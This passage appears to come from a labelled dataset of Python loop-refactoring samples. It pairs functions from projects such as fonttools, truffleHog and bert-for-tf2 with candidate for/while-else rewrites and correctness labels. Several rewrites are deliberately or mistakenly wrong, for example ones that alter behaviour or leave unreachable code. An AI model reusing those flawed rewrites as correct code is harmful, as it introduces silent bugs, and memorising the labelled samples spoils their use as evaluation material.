        print('Below is the list of overlapping blocks in pretrained model and nnFormer architecture:')
        for (key, _) in pretrained_dict.items():
            print(key)
    print('################### Done ###################')
    network.load_state_dict(model_dict)
else:
    raise RuntimeError('Pretrained weights are not compatible with the current network architecture')","break statement is executed:None
break statement is not executed:zejun1"
voice2json,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/voice2json/voice2json/utils.py,https://github.com/synesthesiam/voice2json/tree/master/voice2json/utils.py,,get_profile_downloads$226,"def get_profile_downloads(
    profile_name: str,
    files_dict: typing.Dict[str, typing.Any],
    profile_dir: typing.Union[str, Path],
    grapheme_to_phoneme: bool = False,
    open_transcription: bool = False,
    mixed_language_model: bool = False,
    text_to_speech: bool = False,
    with_examples: bool = True,
    only_missing: bool = True,
    machine: typing.Optional[str] = None,
) -> typing.Iterable[typing.Dict[str, typing.Any]]:
    """"""Yields a dict for each missing profile file with 'url' and 'file' keys""""""
    profile_dir = Path(profile_dir)
    if not machine:
        machine = platform.machine()

    # Format string for file URL.
    # {profile} = profile name (e.g., en-us_kaldi-zamia)
    # {file} = relative file path (e.g. acoustic_model/conf/mfcc.conf)
    # {machine} = platform machine (e.g., x86_64)
    url_format = files_dict.get(""url_format"", DEFAULT_URL_FORMAT)

    # Add files to downloads
    for condition, files in files_dict.items():
        if not isinstance(files, collections.abc.Mapping):
            continue

        # Filter based on condition and arguments
        if (
            (not grapheme_to_phoneme and condition == ""grapheme-to-phoneme"")
            or (not open_transcription and condition == ""open-transcription"")
            or (not mixed_language_model and condition == ""mixed-language-model"")
            or (not text_to_speech and condition == ""text-to-speech"")
            or (not with_examples and condition == ""examples"")
        ):
            _LOGGER.debug(""Excluding condition %s"", condition)
            continue

        for file_path, file_info in files.items():
            _LOGGER.debug(""Checking %s"", file_path)

            if only_missing:
                # Check if file is missing
                real_file_name = file_info.get(""file-name"")
                if real_file_name:
                    # Use combined/unzipped file name
                    expected_path = (
                        profile_dir / Path(file_path).parent / real_file_name
                    )
                else:
                    expected_path = profile_dir / file_path

                if expected_path.is_file():
                    # Skip existing file
                    _LOGGER.debug(""Excluding %s (%s exists)"", file_path, expected_path)
                    continue

                _LOGGER.debug(""%s does not exist (%s)"", expected_path, file_path)

            # Check machine
            platforms = file_info.get(""platform"")
            if platforms:
                machine_match = False
                for platform_matches in platforms:
                    if machine == platform_matches.get(""machine"", """"):
                        machine_match = True
                        break

                if not machine_match:
                    _LOGGER.debug(""Excluding %s (machine mismatch)"", file_path)
                    continue

            # Add extra info to file info
            download_info = dict(file_info)
            download_info[""file""] = file_path
            download_info[""profile""] = profile_name
            download_info[""url""] = url_format.format(
                profile=profile_name, file=file_path
            )
            download_info[""profile-directory""] = str(profile_dir)

            yield download_info","for platform_matches in platforms:
    if machine == platform_matches.get('machine', ''):
        machine_match = True
        break
if not machine_match:
    _LOGGER.debug('Excluding %s (machine mismatch)', file_path)
    continue","for platform_matches in platforms:
    if machine == platform_matches.get('machine', ''):
        break
else:
    _LOGGER.debug('Excluding %s (machine mismatch)', file_path)
    continue","for platform_matches in platforms:
    if machine == platform_matches.get('machine', ''):
        break
else:
    _LOGGER.debug('Excluding %s (machine mismatch)', file_path)
    continue",1,"for platform_matches in platforms:
    if machine == platform_matches.get('machine', ''):
        machine_match = True
        break
if not machine_match:
    _LOGGER.debug('Excluding %s (machine mismatch)', file_path)
    continue","break statement is executed:None
break statement is not executed:zejun1"
fonttools,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/fonttools/Lib/fontTools/varLib/mutator.py,https://github.com/fonttools/fonttools/tree/master/Lib/fontTools/varLib/mutator.py,,instantiateVariableFont$152,"def instantiateVariableFont(varfont, location, inplace=False, overlap=True):
	"""""" Generate a static instance from a variable TTFont and a dictionary
	defining the desired location along the variable font's axes.
	The location values must be specified as user-space coordinates, e.g.:

		{'wght': 400, 'wdth': 100}

	By default, a new TTFont object is returned. If ``inplace`` is True, the
	input varfont is modified and reduced to a static font.

	When the overlap parameter is defined as True,
	OVERLAP_SIMPLE and OVERLAP_COMPOUND bits are set to 1.  See
	https://docs.microsoft.com/en-us/typography/opentype/spec/glyf
	""""""
	if not inplace:
		# make a copy to leave input varfont unmodified
		stream = BytesIO()
		varfont.save(stream)
		stream.seek(0)
		varfont = TTFont(stream)

	fvar = varfont['fvar']
	axes = {a.axisTag:(a.minValue,a.defaultValue,a.maxValue) for a in fvar.axes}
	loc = normalizeLocation(location, axes)
	if 'avar' in varfont:
		maps = varfont['avar'].segments
		loc = {k: piecewiseLinearMap(v, maps[k]) for k,v in loc.items()}
	# Quantize to F2Dot14, to avoid surprise interpolations.
	loc = {k:floatToFixedToFloat(v, 14) for k,v in loc.items()}
	# Location is normalized now
	log.info(""Normalized location: %s"", loc)

	if 'gvar' in varfont:
		log.info(""Mutating glyf/gvar tables"")
		gvar = varfont['gvar']
		glyf = varfont['glyf']
		hMetrics = varfont['hmtx'].metrics
		vMetrics = getattr(varfont.get('vmtx'), 'metrics', None)
		# get list of glyph names in gvar sorted by component depth
		glyphnames = sorted(
			gvar.variations.keys(),
			key=lambda name: (
				glyf[name].getCompositeMaxpValues(glyf).maxComponentDepth
				if glyf[name].isComposite() else 0,
				name))
		for glyphname in glyphnames:
			variations = gvar.variations[glyphname]
			coordinates, _ = glyf._getCoordinatesAndControls(glyphname, hMetrics, vMetrics)
			origCoords, endPts = None, None
			for var in variations:
				scalar = supportScalar(loc, var.axes)
				if not scalar: continue
				delta = var.coordinates
				if None in delta:
					if origCoords is None:
						origCoords, g = glyf._getCoordinatesAndControls(glyphname, hMetrics, vMetrics)
					delta = iup_delta(delta, origCoords, g.endPts)
				coordinates += GlyphCoordinates(delta) * scalar
			glyf._setCoordinates(glyphname, coordinates, hMetrics, vMetrics)
	else:
		glyf = None

	if 'cvar' in varfont:
		log.info(""Mutating cvt/cvar tables"")
		cvar = varfont['cvar']
		cvt = varfont['cvt ']
		deltas = {}
		for var in cvar.variations:
			scalar = supportScalar(loc, var.axes)
			if not scalar: continue
			for i, c in enumerate(var.coordinates):
				if c is not None:
					deltas[i] = deltas.get(i, 0) + scalar * c
		for i, delta in deltas.items():
			cvt[i] += otRound(delta)

	if 'CFF2' in varfont:
		log.info(""Mutating CFF2 table"")
		glyphOrder = varfont.getGlyphOrder()
		CFF2 = varfont['CFF2']
		topDict = CFF2.cff.topDictIndex[0]
		vsInstancer = VarStoreInstancer(topDict.VarStore.otVarStore, fvar.axes, loc)
		interpolateFromDeltas = vsInstancer.interpolateFromDeltas
		interpolate_cff2_PrivateDict(topDict, interpolateFromDeltas)
		CFF2.desubroutinize()
		interpolate_cff2_charstrings(topDict, interpolateFromDeltas, glyphOrder)
		interpolate_cff2_metrics(varfont, topDict, glyphOrder, loc)
		del topDict.rawDict['VarStore']
		del topDict.VarStore

	if 'MVAR' in varfont:
		log.info(""Mutating MVAR table"")
		mvar = varfont['MVAR'].table
		varStoreInstancer = VarStoreInstancer(mvar.VarStore, fvar.axes, loc)
		records = mvar.ValueRecord
		for rec in records:
			mvarTag = rec.ValueTag
			if mvarTag not in MVAR_ENTRIES:
				continue
			tableTag, itemName = MVAR_ENTRIES[mvarTag]
			delta = otRound(varStoreInstancer[rec.VarIdx])
			if not delta:
				continue
			setattr(varfont[tableTag], itemName,
				getattr(varfont[tableTag], itemName) + delta)

	log.info(""Mutating FeatureVariations"")
	for tableTag in 'GSUB','GPOS':
		if not tableTag in varfont:
			continue
		table = varfont[tableTag].table
		if not getattr(table, 'FeatureVariations', None):
			continue
		variations = table.FeatureVariations
		for record in variations.FeatureVariationRecord:
			applies = True
			for condition in record.ConditionSet.ConditionTable:
				if condition.Format == 1:
					axisIdx = condition.AxisIndex
					axisTag = fvar.axes[axisIdx].axisTag
					Min = condition.FilterRangeMinValue
					Max = condition.FilterRangeMaxValue
					v = loc[axisTag]
					if not (Min <= v <= Max):
						applies = False
				else:
					applies = False
				if not applies:
					break

			if applies:
				assert record.FeatureTableSubstitution.Version == 0x00010000
				for rec in record.FeatureTableSubstitution.SubstitutionRecord:
					table.FeatureList.FeatureRecord[rec.FeatureIndex].Feature = rec.Feature
				break
		del table.FeatureVariations

	if 'GDEF' in varfont and varfont['GDEF'].table.Version >= 0x00010003:
		log.info(""Mutating GDEF/GPOS/GSUB tables"")
		gdef = varfont['GDEF'].table
		instancer = VarStoreInstancer(gdef.VarStore, fvar.axes, loc)

		merger = MutatorMerger(varfont, instancer)
		merger.mergeTables(varfont, [varfont], ['GDEF', 'GPOS'])

		# Downgrade GDEF.
		del gdef.VarStore
		gdef.Version = 0x00010002
		if gdef.MarkGlyphSetsDef is None:
			del gdef.MarkGlyphSetsDef
			gdef.Version = 0x00010000

		if not (gdef.LigCaretList or
			gdef.MarkAttachClassDef or
			gdef.GlyphClassDef or
			gdef.AttachList or
			(gdef.Version >= 0x00010002 and gdef.MarkGlyphSetsDef)):
			del varfont['GDEF']

	addidef = False
	if glyf:
		for glyph in glyf.glyphs.values():
			if hasattr(glyph, ""program""):
				instructions = glyph.program.getAssembly()
				# If GETVARIATION opcode is used in bytecode of any glyph add IDEF
				addidef = any(op.startswith(""GETVARIATION"") for op in instructions)
				if addidef:
					break
		if overlap:
			for glyph_name in glyf.keys():
				glyph = glyf[glyph_name]
				# Set OVERLAP_COMPOUND bit for compound glyphs
				if glyph.isComposite():
					glyph.components[0].flags |= OVERLAP_COMPOUND
				# Set OVERLAP_SIMPLE bit for simple glyphs
				elif glyph.numberOfContours > 0:
					glyph.flags[0] |= flagOverlapSimple
	if addidef:
		log.info(""Adding IDEF to fpgm table for GETVARIATION opcode"")
		asm = []
		if 'fpgm' in varfont:
			fpgm = varfont['fpgm']
			asm = fpgm.program.getAssembly()
		else:
			fpgm = newTable('fpgm')
			fpgm.program = ttProgram.Program()
			varfont['fpgm'] = fpgm
		asm.append(""PUSHB[000] 145"")
		asm.append(""IDEF[ ]"")
		args = [str(len(loc))]
		for a in fvar.axes:
			args.append(str(floatToFixed(loc[a.axisTag], 14)))
		asm.append(""NPUSHW[ ] "" + ' '.join(args))
		asm.append(""ENDF[ ]"")
		fpgm.program.fromAssembly(asm)

		# Change maxp attributes as IDEF is added
		if 'maxp' in varfont:
			maxp = varfont['maxp']
			setattr(maxp, ""maxInstructionDefs"", 1 + getattr(maxp, ""maxInstructionDefs"", 0))
			setattr(maxp, ""maxStackElements"", max(len(loc), getattr(maxp, ""maxStackElements"", 0)))

	if 'name' in varfont:
		log.info(""Pruning name table"")
		exclude = {a.axisNameID for a in fvar.axes}
		for i in fvar.instances:
			exclude.add(i.subfamilyNameID)
			exclude.add(i.postscriptNameID)
		if 'ltag' in varfont:
			# Drop the whole 'ltag' table if all its language tags are referenced by
			# name records to be pruned.
			# TODO: prune unused ltag tags and re-enumerate langIDs accordingly
			excludedUnicodeLangIDs = [
				n.langID for n in varfont['name'].names
				if n.nameID in exclude and n.platformID == 0 and n.langID != 0xFFFF
			]
			if set(excludedUnicodeLangIDs) == set(range(len((varfont['ltag'].tags)))):
				del varfont['ltag']
		varfont['name'].names[:] = [
			n for n in varfont['name'].names
			if n.nameID not in exclude
		]

	if ""wght"" in location and ""OS/2"" in varfont:
		varfont[""OS/2""].usWeightClass = otRound(
			max(1, min(location[""wght""], 1000))
		)
	if ""wdth"" in location:
		wdth = location[""wdth""]
		for percent, widthClass in sorted(OS2_WIDTH_CLASS_VALUES.items()):
			if wdth < percent:
				varfont[""OS/2""].usWidthClass = widthClass
				break
		else:
			varfont[""OS/2""].usWidthClass = 9
	if ""slnt"" in location and ""post"" in varfont:
		varfont[""post""].italicAngle = max(-90, min(location[""slnt""], 90))

	log.info(""Removing variable tables"")
	for tag in ('avar','cvar','fvar','gvar','HVAR','MVAR','VVAR','STAT'):
		if tag in varfont:
			del varfont[tag]

	return varfont","for glyph in glyf.glyphs.values():
    if hasattr(glyph, 'program'):
        instructions = glyph.program.getAssembly()
        addidef = any((op.startswith('GETVARIATION') for op in instructions))
        if addidef:
            break
if overlap:
    for glyph_name in glyf.keys():
        glyph = glyf[glyph_name]
        if glyph.isComposite():
            glyph.components[0].flags |= OVERLAP_COMPOUND
        elif glyph.numberOfContours > 0:
            glyph.flags[0] |= flagOverlapSimple","for glyph in glyf.glyphs.values():
    if hasattr(glyph, 'program'):
        instructions = glyph.program.getAssembly()
        addidef = any((op.startswith('GETVARIATION') for op in instructions))
        if addidef:
            break
else:
    for glyph_name in glyf.keys():
        glyph = glyf[glyph_name]
        if glyph.isComposite():
            glyph.components[0].flags |= OVERLAP_COMPOUND
        elif glyph.numberOfContours > 0:
            glyph.flags[0] |= flagOverlapSimple",Cannot refactor,-1,"for glyph in glyf.glyphs.values():
    if hasattr(glyph, 'program'):
        instructions = glyph.program.getAssembly()
        addidef = any((op.startswith('GETVARIATION') for op in instructions))
        if addidef:
            break
if overlap:
    for glyph_name in glyf.keys():
        glyph = glyf[glyph_name]
        if glyph.isComposite():
            glyph.components[0].flags |= OVERLAP_COMPOUND
        elif glyph.numberOfContours > 0:
            glyph.flags[0] |= flagOverlapSimple","break statement is executed:None
break statement is not executed:zejun1"
truffleHog,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/truffleHog/truffleHog/truffleHog.py,https://github.com/trufflesecurity/truffleHog/tree/master/truffleHog/truffleHog.py,,find_strings$323,"def find_strings(git_url, since_commit=None, max_depth=1000000, printJson=False, do_regex=False, do_entropy=True, surpress_output=True,
                custom_regexes={}, branch=None, repo_path=None, path_inclusions=None, path_exclusions=None, allow={}):
    output = {""foundIssues"": []}
    if repo_path:
        project_path = repo_path
    else:
        project_path = clone_git_repo(git_url)
    repo = Repo(project_path)
    already_searched = set()
    output_dir = tempfile.mkdtemp()

    if branch:
        branches = repo.remotes.origin.fetch(branch)
    else:
        branches = repo.remotes.origin.fetch()

    for remote_branch in branches:
        since_commit_reached = False
        branch_name = remote_branch.name
        prev_commit = None
        for curr_commit in repo.iter_commits(branch_name, max_count=max_depth):
            commitHash = curr_commit.hexsha
            if commitHash == since_commit:
                since_commit_reached = True
                break
            # if not prev_commit, then curr_commit is the newest commit. And we have nothing to diff with.
            # But we will diff the first commit with NULL_TREE here to check the oldest code.
            # In this way, no commit will be missed.
            diff_hash = hashlib.md5((str(prev_commit) + str(curr_commit)).encode('utf-8')).digest()
            if not prev_commit:
                prev_commit = curr_commit
                continue
            elif diff_hash in already_searched:
                prev_commit = curr_commit
                continue
            else:
                diff = prev_commit.diff(curr_commit, create_patch=True)
            # avoid searching the same diffs
            already_searched.add(diff_hash)
            foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
            output = handle_results(output, output_dir, foundIssues)
            prev_commit = curr_commit

        # Check if since_commit was used to check which diff should be grabbed
        if since_commit_reached:
            # Handle when there's no prev_commit (used since_commit on the most recent commit)
            if prev_commit is None:
                continue
            diff = prev_commit.diff(curr_commit, create_patch=True)
        else:
            diff = curr_commit.diff(NULL_TREE, create_patch=True)

        foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
        output = handle_results(output, output_dir, foundIssues)
    output[""project_path""] = project_path
    output[""clone_uri""] = git_url
    output[""issues_path""] = output_dir
    if not repo_path:
        repo.close()
        shutil.rmtree(project_path, onerror=del_rw)
    return output","for curr_commit in repo.iter_commits(branch_name, max_count=max_depth):
    commitHash = curr_commit.hexsha
    if commitHash == since_commit:
        since_commit_reached = True
        break
    diff_hash = hashlib.md5((str(prev_commit) + str(curr_commit)).encode('utf-8')).digest()
    if not prev_commit:
        prev_commit = curr_commit
        continue
    elif diff_hash in already_searched:
        prev_commit = curr_commit
        continue
    else:
        diff = prev_commit.diff(curr_commit, create_patch=True)
    already_searched.add(diff_hash)
    foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
    output = handle_results(output, output_dir, foundIssues)
    prev_commit = curr_commit
if since_commit_reached:
    if prev_commit is None:
        continue
    diff = prev_commit.diff(curr_commit, create_patch=True)
else:
    diff = curr_commit.diff(NULL_TREE, create_patch=True)","for curr_commit in repo.iter_commits(branch_name, max_count=max_depth):
    commitHash = curr_commit.hexsha
    if commitHash == since_commit:
        diff = curr_commit.diff(NULL_TREE, create_patch=True)
        break
    diff_hash = hashlib.md5((str(prev_commit) + str(curr_commit)).encode('utf-8')).digest()
    if not prev_commit:
        prev_commit = curr_commit
        continue
    elif diff_hash in already_searched:
        prev_commit = curr_commit
        continue
    else:
        diff = prev_commit.diff(curr_commit, create_patch=True)
    already_searched.add(diff_hash)
    foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
    output = handle_results(output, output_dir, foundIssues)
    prev_commit = curr_commit
else:
    if prev_commit is None:
        continue
    diff = prev_commit.diff(curr_commit, create_patch=True)","for curr_commit in repo.iter_commits(branch_name, max_count=max_depth):
    commitHash = curr_commit.hexsha
    if commitHash == since_commit:
        if prev_commit is None:
            continue
        diff = prev_commit.diff(curr_commit, create_patch=True)
        break
    diff_hash = hashlib.md5((str(prev_commit) + str(curr_commit)).encode('utf-8')).digest()
    if not prev_commit:
        prev_commit = curr_commit
        continue
    elif diff_hash in already_searched:
        prev_commit = curr_commit
        continue
    else:
        diff = prev_commit.diff(curr_commit, create_patch=True)
    already_searched.add(diff_hash)
    foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
    output = handle_results(output, output_dir, foundIssues)
    prev_commit = curr_commit
else:
    diff = curr_commit.diff(NULL_TREE, create_patch=True)",0,"for curr_commit in repo.iter_commits(branch_name, max_count=max_depth):
    commitHash = curr_commit.hexsha
    if commitHash == since_commit:
        since_commit_reached = True
        break
    diff_hash = hashlib.md5((str(prev_commit) + str(curr_commit)).encode('utf-8')).digest()
    if not prev_commit:
        prev_commit = curr_commit
        continue
    elif diff_hash in already_searched:
        prev_commit = curr_commit
        continue
    else:
        diff = prev_commit.diff(curr_commit, create_patch=True)
    already_searched.add(diff_hash)
    foundIssues = diff_worker(diff, curr_commit, prev_commit, branch_name, commitHash, custom_regexes, do_entropy, do_regex, printJson, surpress_output, path_inclusions, path_exclusions, allow)
    output = handle_results(output, output_dir, foundIssues)
    prev_commit = curr_commit
if since_commit_reached:
    if prev_commit is None:
        continue
    diff = prev_commit.diff(curr_commit, create_patch=True)
else:
    diff = curr_commit.diff(NULL_TREE, create_patch=True)","break statement is executed:None
break statement is not executed:zejun1"
kawaii-player,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/kawaii-player/kawaii_player/tvdb_async/tvdb.py,https://github.com/kanishka-linux/kawaii-player/tree/master/kawaii_player/tvdb_async/tvdb.py,TVDB,process_search$278,"def process_search(self, *args):
        search_dict = {}
        result = args[-1]
        srch = args[1]
        eps = args[2]
        exact_found = False
        soup = BeautifulSoup(result.html, 'html.parser')
        info_list = []
        lang = None
        title_text = None
        title_link = None
        tvdb_id = None
        status = None
        original_network = None
        start_date = None
        end_date = None
        min_val = None
        min_dict = {'final':None}
        min_index = 0
        for i, tr in enumerate(soup.findAll('tr')):
            for j, td in enumerate(tr.findAll('td')):
                if j == 0:
                    lang = td.text
                elif j == 1:
                    if 'href' in str(td):
                        txt = td.text
                        if txt.lower() == srch.lower():
                            exact_found = True
                        else:
                            dist = self.levenshtein(txt.lower(), srch.lower())
                            if not min_val:
                                min_val = dist
                                min_index = i
                            else:
                                if min_val > dist:
                                    min_val = dist
                                    min_index = i
                        href = td.find('a')['href']
                        title_text = txt
                        title_link = self.base_url + href
                elif j == 2:
                    tvdb_id = td.text
                elif j == 3:
                    status = td.text
                elif j == 4:
                    original_network = td.text
                elif j == 5:
                    start_date = td.text
                elif j == 6:
                    end_date = td.text
            arg_list = [
                title_text, title_link, tvdb_id, status,
                original_network, start_date, end_date, lang
                ]
            if exact_found:
                search_dict.clear()
                search_dict.update({0:arg_list.copy()})
                break
            elif title_link is None:
                pass
            else:
                search_dict.update({i:arg_list.copy()})
                if min_index == i:
                    min_dict.clear()
                    min_dict = {i:arg_list.copy()}
        if exact_found:
            return search_dict, self.search_and_grab
        else:
            return min_dict, self.search_and_grab","for (i, tr) in enumerate(soup.findAll('tr')):
    for (j, td) in enumerate(tr.findAll('td')):
        if j == 0:
            lang = td.text
        elif j == 1:
            if 'href' in str(td):
                txt = td.text
                if txt.lower() == srch.lower():
                    exact_found = True
                else:
                    dist = self.levenshtein(txt.lower(), srch.lower())
                    if not min_val:
                        min_val = dist
                        min_index = i
                    elif min_val > dist:
                        min_val = dist
                        min_index = i
                href = td.find('a')['href']
                title_text = txt
                title_link = self.base_url + href
        elif j == 2:
            tvdb_id = td.text
        elif j == 3:
            status = td.text
        elif j == 4:
            original_network = td.text
        elif j == 5:
            start_date = td.text
        elif j == 6:
            end_date = td.text
    arg_list = [title_text, title_link, tvdb_id, status, original_network, start_date, end_date, lang]
    if exact_found:
        search_dict.clear()
        search_dict.update({0: arg_list.copy()})
        break
    elif title_link is None:
        pass
    else:
        search_dict.update({i: arg_list.copy()})
        if min_index == i:
            min_dict.clear()
            min_dict = {i: arg_list.copy()}
if exact_found:
    return (search_dict, self.search_and_grab)
else:
    return (min_dict, self.search_and_grab)","for (i, tr) in enumerate(soup.findAll('tr')):
    for (j, td) in enumerate(tr.findAll('td')):
        if j == 0:
            lang = td.text
        elif j == 1:
            if 'href' in str(td):
                txt = td.text
                if txt.lower() == srch.lower():
                    exact_found = True
                else:
                    dist = self.levenshtein(txt.lower(), srch.lower())
                    if not min_val:
                        min_val = dist
                        min_index = i
                    elif min_val > dist:
                        min_val = dist
                        min_index = i
                href = td.find('a')['href']
                title_text = txt
                title_link = self.base_url + href
        elif j == 2:
            tvdb_id = td.text
        elif j == 3:
            status = td.text
        elif j == 4:
            original_network = td.text
        elif j == 5:
            start_date = td.text
        elif j == 6:
            end_date = td.text
    arg_list = [title_text, title_link, tvdb_id, status, original_network, start_date, end_date, lang]
    if exact_found:
        search_dict.clear()
        search_dict.update({0: arg_list.copy()})
        return (search_dict, self.search_and_grab)
        break
    elif title_link is None:
        pass
    else:
        search_dict.update({i: arg_list.copy()})
        if min_index == i:
            min_dict.clear()
            min_dict = {i: arg_list.copy()}
else:
    return (min_dict, self.search_and_grab)","for (i, tr) in enumerate(soup.findAll('tr')):
    for (j, td) in enumerate(tr.findAll('td')):
        if j == 0:
            lang = td.text
        elif j == 1:
            if 'href' in str(td):
                txt = td.text
                if txt.lower() == srch.lower():
                    exact_found = True
                else:
                    dist = self.levenshtein(txt.lower(), srch.lower())
                    if not min_val:
                        min_val = dist
                        min_index = i
                    elif min_val > dist:
                        min_val = dist
                        min_index = i
                href = td.find('a')['href']
                title_text = txt
                title_link = self.base_url + href
        elif j == 2:
            tvdb_id = td.text
        elif j == 3:
            status = td.text
        elif j == 4:
            original_network = td.text
        elif j == 5:
            start_date = td.text
        elif j == 6:
            end_date = td.text
    arg_list = [title_text, title_link, tvdb_id, status, original_network, start_date, end_date, lang]
    if exact_found:
        search_dict.clear()
        search_dict.update({0: arg_list.copy()})
        return (search_dict, self.search_and_grab)
        break
    elif title_link is None:
        pass
    else:
        search_dict.update({i: arg_list.copy()})
        if min_index == i:
            min_dict.clear()
            min_dict = {i: arg_list.copy()}
else:
    return (min_dict, self.search_and_grab)",1,"for (i, tr) in enumerate(soup.findAll('tr')):
    for (j, td) in enumerate(tr.findAll('td')):
        if j == 0:
            lang = td.text
        elif j == 1:
            if 'href' in str(td):
                txt = td.text
                if txt.lower() == srch.lower():
                    exact_found = True
                else:
                    dist = self.levenshtein(txt.lower(), srch.lower())
                    if not min_val:
                        min_val = dist
                        min_index = i
                    elif min_val > dist:
                        min_val = dist
                        min_index = i
                href = td.find('a')['href']
                title_text = txt
                title_link = self.base_url + href
        elif j == 2:
            tvdb_id = td.text
        elif j == 3:
            status = td.text
        elif j == 4:
            original_network = td.text
        elif j == 5:
            start_date = td.text
        elif j == 6:
            end_date = td.text
    arg_list = [title_text, title_link, tvdb_id, status, original_network, start_date, end_date, lang]
    if exact_found:
        search_dict.clear()
        search_dict.update({0: arg_list.copy()})
        break
    elif title_link is None:
        pass
    else:
        search_dict.update({i: arg_list.copy()})
        if min_index == i:
            min_dict.clear()
            min_dict = {i: arg_list.copy()}
if exact_found:
    return (search_dict, self.search_and_grab)
else:
    return (min_dict, self.search_and_grab)","break statement is executed:zejun1
break statement is not executed:None"
CLUEPretrainedModels,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/CLUEPretrainedModels/baselines/models/roberta/create_pretraining_data.py,https://github.com/CLUEbenchmark/CLUEPretrainedModels/tree/master/baselines/models/roberta/create_pretraining_data.py,,get_new_segment$250,"def get_new_segment(segment): #  新增的方法 ####
    """"""
    输入一句话，返回一句经过处理的话: 为了支持中文全称mask，将被分开的词，将上特殊标记(""#"")，使得后续处理模块，能够知道哪些字是属于同一个词的。
    :param segment: 一句话
    :return: 一句处理过的话
    """"""
    seq_cws = jieba.lcut("""".join(segment))
    seq_cws_dict = {x: 1 for x in seq_cws}
    new_segment = []
    i = 0
    while i < len(segment):
        if len(re.findall('[\u4E00-\u9FA5]', segment[i]))==0: # 不是中文的，原文加进去。
            new_segment.append(segment[i])
            i += 1
            continue

        has_add = False
        for length in range(3,0,-1):
            if i+length>len(segment):
                continue
            if ''.join(segment[i:i+length]) in seq_cws_dict:
                new_segment.append(segment[i])
                for l in range(1, length):
                    new_segment.append('##' + segment[i+l])
                i += length
                has_add = True
                break
        if not has_add:
            new_segment.append(segment[i])
            i += 1
    return new_segment","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        has_add = True
        break
if not has_add:
    new_segment.append(segment[i])
    i += 1","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        break
else:
    new_segment.append(segment[i])
    i += 1","for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        break
else:
    new_segment.append(segment[i])
    i += 1",1,"for length in range(3, 0, -1):
    if i + length > len(segment):
        continue
    if ''.join(segment[i:i + length]) in seq_cws_dict:
        new_segment.append(segment[i])
        for l in range(1, length):
            new_segment.append('##' + segment[i + l])
        i += length
        has_add = True
        break
if not has_add:
    new_segment.append(segment[i])
    i += 1","break statement is executed:None
break statement is not executed:zejun1"
bert-for-tf2,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/bert-for-tf2/bert/tokenization/bert_tokenization.py,https://github.com/kpe/bert-for-tf2/tree/master/bert/tokenization/bert_tokenization.py,WordpieceTokenizer,tokenize$308,"def tokenize(self, text):
        """"""Tokenizes a piece of text into its word pieces.

        This uses a greedy longest-match-first algorithm to perform tokenization
        using the given vocabulary.

        For example:
          input = ""unaffable""
          output = [""un"", ""##aff"", ""##able""]

        Args:
          text: A single token or whitespace separated tokens. This should have
            already been passed through `BasicTokenizer.

        Returns:
          A list of wordpiece tokens.
        """"""

        text = convert_to_unicode(text)

        output_tokens = []
        for token in whitespace_tokenize(text):
            chars = list(token)
            if len(chars) > self.max_input_chars_per_word:
                output_tokens.append(self.unk_token)
                continue

            is_bad = False
            start = 0
            sub_tokens = []
            while start < len(chars):
                end = len(chars)
                cur_substr = None
                while start < end:
                    substr = """".join(chars[start:end])
                    if start > 0:
                        substr = ""##"" + substr
                    if substr in self.vocab:
                        cur_substr = substr
                        break
                    end -= 1
                if cur_substr is None:
                    is_bad = True
                    break
                sub_tokens.append(cur_substr)
                start = end

            if is_bad:
                output_tokens.append(self.unk_token)
            else:
                output_tokens.extend(sub_tokens)
        return output_tokens","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)","while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        output_tokens.append(self.unk_token)
        break
    sub_tokens.append(cur_substr)
    start = end
else:
    output_tokens.extend(sub_tokens)",1,"while start < len(chars):
    end = len(chars)
    cur_substr = None
    while start < end:
        substr = ''.join(chars[start:end])
        if start > 0:
            substr = '##' + substr
        if substr in self.vocab:
            cur_substr = substr
            break
        end -= 1
    if cur_substr is None:
        is_bad = True
        break
    sub_tokens.append(cur_substr)
    start = end
if is_bad:
    output_tokens.append(self.unk_token)
else:
